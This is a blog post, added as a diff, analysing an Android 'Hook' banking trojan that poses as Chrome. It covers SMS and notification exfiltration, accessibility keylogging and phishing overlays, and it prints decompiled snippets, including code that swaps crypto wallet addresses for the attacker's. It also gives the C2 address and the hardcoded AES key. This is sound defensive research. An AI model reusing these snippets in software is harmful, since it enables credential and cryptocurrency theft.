@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        k0m1
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            Hook-Analysis
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <p><strong>Sample Details:</strong></p>
+<p>SHA256 Hash: <code>75f42606987885c36a1576c06ec0e012967bd7e4c03f5754d967575da43589b4</code></p>
+<p>Package Name: <code>com.dufusobudijige.wita</code></p>
+<p>Application Name: <code>Chrome</code></p>
+<h3 id="Components-Analysis"><a href="#Components-Analysis" class="headerlink" title="Components Analysis"></a>Components Analysis</h3><ul>
+<li><p>Starting with AndroidManifest.xml, the app has a launcher activity <code>com.dufusobudijige.wita.numahuzifabu</code>, which is accompanied by tons of alias activities with names like Google Play, Gmail, Whatsapp, Youtube and so on. There are various activities and services defined in the manifest, including an Accessibility Service. The app also has a receiver for incoming SMS messages. </p>
+</li>
+<li><p>The app has a lot of permissions, including <code>READ_SMS</code>, <code>RECEIVE_SMS</code>, <code>SEND_SMS</code>, <code>READ_CONTACTS</code>, <code>WRITE_CONTACTS</code>, <code>CALL_PHONE</code>,  <code>GET_ACCOUNTS</code>, <code>USE_FINGERPRINT</code>, <code>ACCESS_FINE_LOCATION</code>, and so on. </p>
+</li>
+<li><p>Starting with the launcher activity, its duty is to manage the alias activities like enabling certain activities and disabling others. More Importantly, it also requests for the <code>ACCESSIBILITY_SERVICE</code> permission.</p>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">mw_disable_alias</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">PackageManager</span> <span class="variable">packageManager</span> <span class="operator">=</span> getPackageManager();</span><br><span class="line">    <span class="keyword">if</span> (packageManager != <span class="literal">null</span>) &#123;</span><br><span class="line">        packageManager.setComponentEnabledSetting(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="built_in">this</span>, d1.a.c(<span class="built_in">this</span>, <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(), <span class="string">&quot;.numahuzifabu&quot;</span>)), <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">PackageManager</span> <span class="variable">packageManager2</span> <span class="operator">=</span> getPackageManager();</span><br><span class="line">    <span class="keyword">if</span> (packageManager2 != <span class="literal">null</span>) &#123;</span><br><span class="line">        packageManager2.setComponentEnabledSetting(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="built_in">this</span>, d1.a.c(<span class="built_in">this</span>, <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(), <span class="string">&quot;.Facebook&quot;</span>)), <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">PackageManager</span> <span class="variable">packageManager3</span> <span class="operator">=</span> getPackageManager();</span><br><span class="line">    <span class="keyword">if</span> (packageManager3 != <span class="literal">null</span>) &#123;</span><br><span class="line">        packageManager3.setComponentEnabledSetting(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="built_in">this</span>, d1.a.c(<span class="built_in">this</span>, <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(), <span class="string">&quot;.TikTok&quot;</span>)), <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    [....]</span><br></pre></td></tr></table></figure></li>
+<li><p>Looking into the message receiver <code>com.boseyepihuvusa.cuvo.bopiroxa.nejaziwevudi</code>. As expected, it extracts message content and sender address and exfiltrates it to the C2 server. </p>
+</li>
+<li><p>The app also has a Device Admin Receiver <code>com.boseyepihuvusa.cuvo.yawusomewo.moyuhedudurike</code>. It policies are provided in the <code>res/xml/kazizuhazo.xml</code>. It includes policies like <strong>reset-password</strong>, <strong>disable-keyguard-features</strong>, <strong>force-lock</strong> and much more. </p>
+</li>
+<li><p>There is also a Notification Listener <code>com.boseyepihuvusa.cuvo.geveka.jecusezi</code>. It extracts text , package name , timestamp of the notification and sends it to the C2 server.</p>
+</li>
+<li><p>There is also an activity <code>com.boseyepihuvusa.cuvo.saparowenu.nixacafiwuri</code>, that loads phishing pages in a webview. </p>
+<p>  <img src="/../images/hook-analysis/image1.png" alt="webview"></p>
+<p>  <img src="/../images/hook-analysis/image2.png" alt="phishing_page"></p>
+</li>
+</ul>
+<h3 id="Accessibility-Service"><a href="#Accessibility-Service" class="headerlink" title="Accessibility Service"></a>Accessibility Service</h3><ul>
+<li><p>The app has an accessibility service <code>com.boseyepihuvusa.cuvo.refu.kogolano</code>. Its capabilities are included in the <code>res/xml/gipuco.xml</code>. Simply put, it can perform human actions like clicks , scroll and can also read the screen content. </p>
+</li>
+<li><p>There is a method that keylogs events like <strong>view click</strong> [type&#x3D;1] , <strong>view focused</strong> [type&#x3D;8] , <strong>text changed</strong> [type&#x3D;16] , <strong>window changed</strong> [type&#x3D;32].</p>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (eventType2 == <span class="number">1</span>) &#123;</span><br><span class="line">    Log.v(<span class="string">&quot;Logger&quot;</span>, <span class="string">&quot;[VIEW_CLICKED] &quot;</span>.concat(obj));</span><br><span class="line">    aVar = g.f1427i;</span><br><span class="line">    jSONObject = <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    jSONObject.put(<span class="string">&quot;[VIEW_CLICKED]&quot;</span>, obj);</span><br><span class="line">    <span class="type">f</span> <span class="variable">fVar</span> <span class="operator">=</span> f.f14a;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (eventType2 == <span class="number">8</span>) &#123;</span><br><span class="line">    Log.v(<span class="string">&quot;Logger&quot;</span>, <span class="string">&quot;[VIEW_FOCUSED] &quot;</span>.concat(obj));</span><br><span class="line">    aVar = g.f1427i;</span><br><span class="line">    jSONObject = <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    jSONObject.put(<span class="string">&quot;[VIEW_FOCUSED]&quot;</span>, obj);</span><br><span class="line">    <span class="type">f</span> <span class="variable">fVar2</span> <span class="operator">=</span> f.f14a;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (eventType2 == <span class="number">16</span>) &#123;</span><br><span class="line">    Log.v(<span class="string">&quot;Logger&quot;</span>, <span class="string">&quot;[TEXT_CHANGED] &quot;</span>.concat(obj));</span><br><span class="line">    aVar = g.f1427i;</span><br><span class="line">    jSONObject = <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    jSONObject.put(<span class="string">&quot;[TEXT_CHANGED]&quot;</span>, obj);</span><br><span class="line">    <span class="type">f</span> <span class="variable">fVar3</span> <span class="operator">=</span> f.f14a;</span><br><span class="line">&#125; ....</span><br></pre></td></tr></table></figure></li>
+<li><p>There is also another function that collects notification information using <strong>TYPE_NOTIFICATION_STATE_CHANGED</strong> [type&#x3D;64].</p>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    str = accessibilityEvent.getText().get(<span class="number">0</span>).toString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e4) &#123;</span><br><span class="line">    g.<span class="type">a</span> <span class="variable">aVar</span> <span class="operator">=</span> g.f1427i;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;readPush &quot;</span> + e4.getLocalizedMessage();</span><br><span class="line">    aVar.getClass();</span><br><span class="line">    g.a.g(<span class="string">&quot;&quot;</span>, str2, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        z4 = accessibilityEvent.getText().toString();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">        z4 = a0.z(th);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (z4 <span class="keyword">instanceof</span> c.a) &#123;</span><br><span class="line">        z4 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    str = (String) z4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jSONObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">jSONObject.put(<span class="string">&quot;package&quot;</span>, k());</span><br><span class="line">jSONObject.put(<span class="string">&quot;ticker&quot;</span>, notification.tickerText);</span><br><span class="line">jSONObject.put(<span class="string">&quot;notification&quot;</span>, str);</span><br><span class="line">jSONObject.put(<span class="string">&quot;text&quot;</span>, String.valueOf(notification.extras.getCharSequence(<span class="string">&quot;android.text&quot;</span>)));</span><br></pre></td></tr></table></figure></li>
+<li><p>This app maintains persistence by making sure user cant uninstall app by performing <strong>performAction(16)</strong> which is equivalent coming to Home screen.</p>
+</li>
+<li><p>Alright, lets enter one of the most interesting part of the analysis. This family of malware is known for terrorizing the life of Banking and Crypto applications. Here is how its starts.</p>
+<ul>
+<li>When there is Window Change event and when <code>accessibilityEvent.getContentChangeTypes() == 2</code>, which is usually associated to <code>TYPE_VIEW_LONG_CLICKED</code>, the app will obtain an instance of <code>Clipboard</code> Service.</li>
+</ul>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">b</span> <span class="variable">bVar2</span> <span class="operator">=</span> mw_AccessiblityService.f995q;</span><br><span class="line">    systemService = mw_accessiblityservice.getApplicationContext().getSystemService(<span class="string">&quot;clipboard&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">    z4 = a0.z(th);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>It then enters a function which checks whether a <code>TYPE_VIEW_TEXT_CHANGED</code> was triggered. If so, it will check whether the text entered satisfies the regex check for a <strong>Ethereum</strong> &#x2F; <strong>Bitcoin</strong> address. If so, it will copy the text to the clipboard and replace it with the malicious address.</li>
+</ul>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (accessibilityEvent.getEventType() == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        cVar3 = mw_AccessiblityService.mw_eth_hash_regex;</span><br><span class="line">        cVar3.getClass();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">        z3 = a0.z(th);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cVar3.d.matcher(str).find()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">mw_str_replace</span> <span class="operator">=</span> cVar3.mw_str_replace(str, <span class="string">&quot;0x3Cf7d4A8D30035Af83058371f0C6D4369B5024Ca&quot;</span>); <span class="comment">// For Ethereum</span></span><br><span class="line">        clipboardManager.setPrimaryClip(ClipData.newPlainText(mw_str_replace, mw_str_replace));</span><br><span class="line">        <span class="type">Bundle</span> <span class="variable">bundle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">        bundle.putCharSequence(<span class="string">&quot;ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE&quot;</span>, mw_str_replace);</span><br><span class="line">        <span class="type">AccessibilityNodeInfo</span> <span class="variable">source</span> <span class="operator">=</span> accessibilityEvent.getSource();</span><br><span class="line">        <span class="keyword">if</span> (source != <span class="literal">null</span>) &#123;</span><br><span class="line">            source.performAction(<span class="number">2097152</span>, bundle);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    [......]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cVar2.d.matcher(str).find()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">mw_str_replace2</span> <span class="operator">=</span> cVar2.mw_str_replace(str, <span class="string">&quot;bc1ql34xd8ynty3myfkwaf8jqeth0p4fxkxg673vlf&quot;</span>); <span class="comment">// For Bitcoin</span></span><br><span class="line">        clipboardManager.setPrimaryClip(ClipData.newPlainText(mw_str_replace2, mw_str_replace2));</span><br><span class="line">        <span class="type">Bundle</span> <span class="variable">bundle2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">        bundle2.putCharSequence(<span class="string">&quot;ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE&quot;</span>, mw_str_replace2);</span><br><span class="line">        <span class="type">AccessibilityNodeInfo</span> <span class="variable">source2</span> <span class="operator">=</span> accessibilityEvent.getSource();</span><br><span class="line">        <span class="keyword">if</span> (source2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            source2.performAction(<span class="number">2097152</span>, bundle2);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  [+] Here is a video clipping that I recorded while testing the clipboard hijacking functionality.</p>
+<p>  <video width="640" height="480" controls><source src="/images/hook-analysis/clipboard.mp4" type="video/mp4"></video></p>
+<ul>
+<li>This application targets popular Crypto wallets like <strong>Metamask</strong>, <strong>Bitcoin &amp; Crypto DeFi Wallet</strong>, <strong>Mycelium Bitcoin Wallet</strong> and try to collect wallet information, mnemonic phrases and so on.</li>
+</ul>
+</li>
+</ul>
+<h3 id="HTTP-Communication"><a href="#HTTP-Communication" class="headerlink" title="HTTP Communication"></a>HTTP Communication</h3><ul>
+<li><p>The C2 Server is hosted on <code>http[:]//176.65.138.18:3434</code>. The requests are encrypted with AES-CBC with additional Base64 encoding. </p>
+</li>
+<li><p>All endpoints are resolved during runtime. </p>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">h4</span> <span class="operator">=</span> a0.h(a0.f2778c0, <span class="string">&quot;urlAdminPanel&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (h4 == <span class="literal">null</span>) &#123;</span><br><span class="line">    h4 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">sb.append(h4);</span><br><span class="line">sb.append(<span class="string">&quot;/php/&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">nextInt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">20</span>) + <span class="number">1</span>;</span><br><span class="line"><span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>; i4 &lt; nextInt; i4++) &#123;</span><br><span class="line">    sb2.append(<span class="string">&quot;qwertyuiopasdfghjklzxcvbnm1234567890&quot;</span>.charAt(random.nextInt(<span class="number">36</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">sb3</span> <span class="operator">=</span> sb2.toString();</span><br><span class="line">j3.i.c(sb3, <span class="string">&quot;buf.toString()&quot;</span>);</span><br><span class="line">sb.append(sb3);</span><br><span class="line">sb.append(<span class="string">&quot;.php/&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="/../images/hook-analysis/image4.png" alt="http_communication"></p>
+</li>
+</ul>
+<h3 id="Commands"><a href="#Commands" class="headerlink" title="Commands"></a>Commands</h3><p>Here are the most commonly used commands that I found in the app.</p>
+<ul>
+<li><p><code>updateSubInfo</code> : Provides the C2 Server with initial app status and device information.</p>
+</li>
+<li><p><code>update</code>:  Exfiltrates updated app status with even more detailed information like IMEI , Phone Number and so on.</p>
+</li>
+<li><p><code>checkAP</code>: Its like a ping command. It checks if the app is still alive and running.</p>
+</li>
+<li><p><code>downloadInjections</code>: Downloads the phishing pages of targetted apps. </p>
+</li>
+<li><p><code>logs</code>: Exfiltrates different log messages like SMS messages, Dial Info, Notification info and so on.</p>
+</li>
+</ul>
+<h3 id="Evasion-Techniques"><a href="#Evasion-Techniques" class="headerlink" title="Evasion Techniques"></a>Evasion Techniques</h3><ul>
+<li><p>This app has around 5-6 different methods for emulator detection. Infact, it was necessary for me to hook all of these methods using Frida to make sure the app runs smoothly. Here is the <a target="_blank" rel="noopener" href="https://github.com/xk0m1/misc/blob/main/malware/hook/script.js">link</a> to the script I used.</p>
+</li>
+<li><p>Checks include</p>
+<ul>
+<li>Check if Hook is running in an emulator</li>
+</ul>
+<p>  <img src="/../images/hook-analysis/image3.png" alt="emulator_check"></p>
+<ul>
+<li>Check if ADB over WiFI is enabled</li>
+<li>Check if USB devices are connected</li>
+<li>Check if device is charging via USB or Wireless</li>
+</ul>
+</li>
+</ul>
+<h3 id="Encryption-Decryption"><a href="#Encryption-Decryption" class="headerlink" title="Encryption &amp; Decryption"></a>Encryption &amp; Decryption</h3><ul>
+<li><p>The app uses AES-CBC with PKCS5 padding for encryption and decryption. The key and iv are hardcoded in the app. </p>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">mw_aes_key</span> <span class="operator">=</span> <span class="string">&quot;1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">mw_aes_iv</span> <span class="operator">=</span> <span class="string">&quot;0123456789abcdef&quot;</span>;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>This was an interesting sample to analyze. Particularly the clipboard hijacking functionality was something I have never seen before. This app gave me a new perspective on how malware authors are using Accessibility Service to perform malicious activities. Hopefully, this writeup will help you understand the inner workings of this malware family. </p>
+<p>Thanks for reading.</p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label>
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
